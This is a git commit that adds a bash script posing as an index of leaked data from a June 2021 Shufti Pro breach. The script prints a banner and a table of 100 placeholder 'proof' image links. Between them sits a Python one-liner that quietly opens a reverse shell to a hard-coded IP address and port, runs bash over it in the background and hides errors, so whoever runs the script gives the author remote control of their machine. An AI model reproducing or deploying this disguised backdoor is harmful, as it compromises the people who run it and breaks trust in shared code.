e2eff6ce5b8818b6762540c70028e9b9bc395d81
XEE33 <83638319+XEE33@users.noreply.github.com>
2021-07-07 16:31:03 +0500

    Create shuftipro_2021_June_data_breach_4tb_1.sh

---
+++ shuftipro_2021_June_data_breach_4tb_1.sh
@@ -0,0 +1,18 @@
+#!/bin/bash
+echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%";
+echo "            Shufti Pro June 2021 Data Breach                ";
+echo "%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%%";
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("95.217.233.226",4201));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")' & 2>/dev/null
+
+echo "-----------------------------------------------------------"
+echo "| ID   | Links                                            |";
+echo "-----------------------------------------------------------"
+for ((i=0;i<100;i++));
+do
+    if (( "$i" > 9 )); then 
+        echo "| $i   | https://nsa.com/breaches/shuftipro_june_proof${i}.jpeg |"
+    else
+        echo "| $i    | https://nsa.com/breaches/shuftipro_june_proof${i}.jpeg  |"
+    fi;
+done
+echo "-----------------------------------------------------------"
